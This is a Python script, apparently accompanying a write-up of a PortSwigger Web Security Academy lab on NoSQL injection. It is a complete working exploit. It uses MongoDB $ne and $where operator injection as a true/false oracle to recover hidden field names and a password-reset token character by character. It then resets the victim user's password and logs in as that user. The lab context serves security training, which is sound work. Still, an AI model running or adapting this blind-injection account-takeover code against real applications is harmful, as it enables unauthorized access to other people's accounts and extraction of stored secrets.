#!/usr/bin/env python3
"""
Exploiting NoSQL operator injection to extract unknown fields
PortSwigger Web Security Academy -- NoSQL Injection

Companion script for the writeup: 04-nosql-operator-injection-extract-unknown-fields.md

What this does:
    Confirms operator injection against JSON POST /login by sending
    {"username":"carlos","password":{"$ne":""}}, which returns "Account locked:
    please reset your password" instead of the generic invalid-login message --
    that's the true/false oracle used for every step that follows. Confirms the
    application evaluates a top-level $where clause as JavaScript with "$where":"0"
    vs "$where":"1". Then -- critically, and BEFORE any field discovery -- triggers
    /forgot-password for carlos, because the reset-token field doesn't exist in his
    document until a reset flow creates it; sweeping for it earlier would search for
    a field that isn't there yet. Only after that does it sweep Object.keys(this) by
    index and character (regex-anchored, one char at a time) to recover the field
    names -- the known ones first (_id, username, password, email), then the
    reset-token field created by the trigger step. It then extracts that field's
    value the same way and uses it to complete the password reset and log in as
    carlos.

Usage:
    python 04-nosql-operator-injection-extract-unknown-fields.py <lab-url>

Requirements:
    pip install httpx
"""

import asyncio
import re
import string
import sys
import httpx

CHARSET_FIELDS = string.ascii_lowercase + string.digits + "_" + string.ascii_uppercase + "-"
CHARSET_TOKEN = string.digits + string.ascii_lowercase
FULL_TOKEN_CHARSET = CHARSET_TOKEN + string.ascii_uppercase + string.punctuation
LOCKED = "Account locked"
KNOWN_FIELDS = {"_id", "username", "password", "email"}


async def solve_async(lab_url: str) -> None:
    login_url = f"{lab_url}/login"
    fp_url = f"{lab_url}/forgot-password"

    async with httpx.AsyncClient(timeout=15, follow_redirects=False) as client:
        r = await client.post(login_url, json={"username": "carlos", "password": {"$ne": ""}})
        is_locked = LOCKED in r.text
        print(f"[*] $ne injection: {'Account locked' if is_locked else 'No injection'}")
        if not is_locked:
            print("[-] Operator injection not confirmed, stopping.")
            return

        r0 = await client.post(login_url, json={"username": "carlos", "password": {"$ne": ""}, "$where": "0"})
        r1 = await client.post(login_url, json={"username": "carlos", "password": {"$ne": ""}, "$where": "1"})
        print(f"[*] $where=0: {'locked' if LOCKED in r0.text else 'invalid'}, "
              f"$where=1: {'locked' if LOCKED in r1.text else 'invalid'}")

        # Must happen before the Object.keys() sweep -- the reset-token field
        # does not exist on carlos's document until this flow creates it.
        r_fp = await client.get(fp_url)
        csrf = re.search(r'name="csrf"\s+value="([^"]+)"', r_fp.text).group(1)
        await client.post(fp_url, data={"csrf": csrf, "username": "carlos"}, cookies=r_fp.cookies)
        print("[*] Triggered forgot-password for carlos")

        sem = asyncio.Semaphore(10)
        fields = []

        async def _try_field_ch(ch, key_idx, pos):
            async with sem:
                where = f"Object.keys(this)[{key_idx}].match('^.{{{pos}}}{re.escape(ch)}.*')"
                r = await client.post(
                    login_url,
                    json={"username": "carlos", "password": {"$ne": ""}, "$where": where},
                )
                return ch if LOCKED in r.text else None

        for key_idx in range(10):
            field_name = ""
            for pos in range(50):
                tasks = [_try_field_ch(ch, key_idx, pos) for ch in CHARSET_FIELDS]
                results = await asyncio.gather(*tasks)
                match = next((c for c in results if c is not None), None)
                if match:
                    field_name += match
                else:
                    break
            if field_name:
                fields.append(field_name)
                print(f"  [+] Field {key_idx}: {field_name}")
            else:
                break

        unknown = [f for f in fields if f not in KNOWN_FIELDS]
        if not unknown:
            print("[-] No unknown fields found -- did the forgot-password trigger run?")
            return

        token_field = unknown[0]
        print(f"[+] Unknown field: {token_field}")

        async def _test_token_len(length):
            async with sem:
                where = f"this.{token_field}.length == {length}"
                r = await client.post(
                    login_url,
                    json={"username": "carlos", "password": {"$ne": ""}, "$where": where},
                )
                return length if LOCKED in r.text else None

        tl_tasks = [_test_token_len(l) for l in range(1, 65)]
        tl_results = await asyncio.gather(*tl_tasks)
        token_len = next((l for l in tl_results if l is not None), 0)
        print(f"[+] Token length: {token_len}")

        token = ""

        async def _try_token_ch(ch, prefix):
            async with sem:
                where = f"this.{token_field}.match('^{re.escape(prefix)}{re.escape(ch)}.*')"
                r = await client.post(
                    login_url,
                    json={"username": "carlos", "password": {"$ne": ""}, "$where": where},
                )
                return ch if LOCKED in r.text else None

        for pos in range(token_len):
            tasks = [_try_token_ch(ch, token) for ch in FULL_TOKEN_CHARSET]
            results = await asyncio.gather(*tasks)
            match = next((c for c in results if c is not None), None)
            if match:
                token += match
                print(f"  [+] {token_field}[{pos}] = {match} -> {token}")
            else:
                print(f"  [-] no candidate matched at position {pos}, stopping early")
                break

        print(f"[+] Extracted token: {token}")

        r_reset_page = await client.get(f"{fp_url}?{token_field}={token}")
        csrf2 = re.search(r'name="csrf"\s+value="([^"]+)"', r_reset_page.text).group(1)
        new_pass = "hacked123"
        await client.post(
            fp_url,
            data={
                "csrf": csrf2, token_field: token,
                "new-password-1": new_pass, "new-password-2": new_pass,
            },
            cookies=r_reset_page.cookies,
        )
        print(f"[*] Password reset to '{new_pass}'")

        r_login = await client.post(login_url, json={"username": "carlos", "password": new_pass})
        print(f"[*] Login: {r_login.status_code} loc={r_login.headers.get('location', '')}")

        r_home = await client.get(lab_url, follow_redirects=True)
        if "Congratulations" in r_home.text:
            print("[+] Lab solved -- reset carlos's password via the extracted token field and logged in.")
        else:
            print("[-] Not solved yet -- verify the extracted field name and token.")


def solve(lab_url: str) -> None:
    asyncio.run(solve_async(lab_url))


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
